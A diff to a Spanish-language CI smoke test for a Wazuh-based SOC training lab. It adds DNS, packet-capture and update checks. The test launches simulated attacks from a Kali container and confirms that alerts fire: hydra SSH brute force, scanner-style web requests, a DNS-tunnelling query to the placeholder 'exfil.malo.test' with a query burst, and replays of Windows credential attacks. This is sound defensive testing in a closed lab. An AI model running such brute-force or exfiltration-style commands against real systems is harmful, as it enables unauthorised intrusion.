@@ -2,7 +2,8 @@
 # =============================================================================
 #  Prueba de humo del laboratorio (la usa la CI en x86_64 y en ARM64).
 #  Comprueba que: Wazuh arranca, los agentes conectan, y que los ataques del
-#  curso generan alertas (fuerza bruta SSH, escaneo web y replay de Windows).
+#  curso generan alertas (fuerza bruta SSH, escaneo web, DNS y replay de Windows).
+#  También prueba ./lab.sh capture, ./lab.sh version y ./lab.sh update.
 #  También puedes lanzarla tú:  ./tests/smoke.sh
 # =============================================================================
 set -euo pipefail
@@ -20,15 +21,15 @@ ko()   { printf "\033[1;31m  ✘ %s\033[0m\n" "$*"; FAILED=1; }
 step "1. Instalación (./lab.sh setup)"
 ./lab.sh setup
 
-step "2. Los agentes srv-web y srv-ssh están activos"
-for i in $(seq 1 30); do
+step "2. Los agentes srv-web, srv-ssh y srv-dns están activos"
+for _ in $(seq 1 30); do
   active=$(docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -l \
-             | grep -cE "Name: srv-(web|ssh).*Active" || true)
-  [ "$active" -ge 2 ] && break
+             | grep -cE "Name: srv-(web|ssh|dns).*Active" || true)
+  [ "$active" -ge 3 ] && break
   sleep 10
 done
 docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -l | grep "ID:" || true
-[ "${active:-0}" -ge 2 ] && ok "2 agentes activos" || ko "Solo ${active:-0} agentes activos"
+[ "${active:-0}" -ge 3 ] && ok "3 agentes activos" || ko "Solo ${active:-0} agentes activos"
 
 step "3. Fuerza bruta SSH desde la Kali (hydra)"
 docker compose exec -T attacker hydra -l soporte -P /root/wordlists/passwords.txt \
@@ -44,6 +45,32 @@ docker compose exec -T attacker bash -c \
      curl -s -o /dev/null -A "Nikto/2.5.0" "http://172.30.10.10/$p"; done'
 ok "15 peticiones enviadas"
 
+step "4b. DNS: la Kali resuelve la zona interna con srv-dns"
+docker compose exec -T attacker dig +short srv-web.hackerlab.local | tee /tmp/dig.txt
+grep -qx "172.30.10.10" /tmp/dig.txt && ok "srv-web.hackerlab.local = 172.30.10.10" || ko "srv-web.hackerlab.local no resuelve"
+docker compose exec -T attacker dig +short TXT hackerlab.local | grep -q "spf1" \
+  && ok "registro TXT (SPF) de hackerlab.local" || ko "falta el TXT de hackerlab.local"
+docker compose exec -T attacker dig +short -x 172.30.10.11 | grep -q "srv-ssh.hackerlab.local" \
+  && ok "resolución inversa (PTR) de 172.30.10.11" || ko "falla la resolución inversa"
+LONG=$(printf 'a%.0s' $(seq 1 60))
+docker compose exec -T attacker dig +short "${LONG}.exfil.malo.test" >/dev/null || true
+docker compose exec -T attacker bash -c 'for i in $(seq 1 45); do dig +short +tries=1 +time=2 "q$i.malo.test" >/dev/null; done'
+ok "consulta con subdominio largo y ráfaga de 45 consultas enviadas"
+
+step "4c. Herramientas de red en la Kali y captura de tráfico"
+docker compose exec -T attacker sh -c 'command -v tcpdump >/dev/null && command -v ss >/dev/null && command -v ip >/dev/null' \
+  && ok "tcpdump, ss e ip en la Kali" || ko "faltan tcpdump, ss o ip en la Kali"
+( sleep 4; docker compose exec -T attacker curl -s -o /dev/null http://172.30.10.10/ ) &
+./lab.sh capture srv-web 10
+wait
+PCAP=$(ls -t captures/srv-web-*.pcap 2>/dev/null | head -n 1 || true)
+if [ -n "$PCAP" ] && [ "$(wc -c < "$PCAP")" -gt 200 ]; then
+  ok "captura creada: $PCAP ($(wc -c < "$PCAP") bytes)"
+else
+  ko "./lab.sh capture no ha creado una captura con tráfico"
+fi
+./lab.sh version | grep -q "soc-lab $(cat VERSION)" && ok "./lab.sh version" || ko "./lab.sh version"
+
 step "5. Replay de ataques de Windows"
 ./lab.sh replay dcsync pass-the-hash psexec lsass-mimikatz
 
@@ -55,7 +82,7 @@ count() {
 }
 check() {
   local label="$1" query="$2" n=0
-  for i in $(seq 1 18); do
+  for _ in $(seq 1 18); do
     n=$(count "$query")
     [ "$n" -gt 0 ] && break
     sleep 10
@@ -65,6 +92,16 @@ check() {
 check "SSH: autenticación fallida en srv-ssh" 'agent.name:srv-ssh AND rule.groups:authentication_failed'
 check "Web: errores 4xx en srv-web"           'agent.name:srv-web AND rule.groups:web'
 check "Windows: eventos reproducidos"          'rule.groups:windows'
+check "DNS: consultas de la Kali en srv-dns"   'agent.name:srv-dns AND rule.id:100111 AND data.srcip:172.30.10.66'
+check "DNS: respuestas de srv-dns"             'agent.name:srv-dns AND rule.id:100112'
+check "DNS: subdominio largo (túnel)"          'rule.id:100113'
+check "DNS: ráfaga de consultas"               'rule.id:100114'
+
+step "7. ./lab.sh update (sin descargar: reconstruye y arranca conservando los datos)"
+before=$(count 'rule.id:100111')
+SOC_LAB_NO_PULL=1 ./lab.sh update
+after=$(count 'rule.id:100111')
+[ "$after" -ge "$before" ] && [ "$before" -gt 0 ] && ok "las alertas se conservan tras update ($after)" || ko "se han perdido alertas tras update ($before → $after)"
 
 echo
 if [ "$FAILED" -eq 0 ]; then
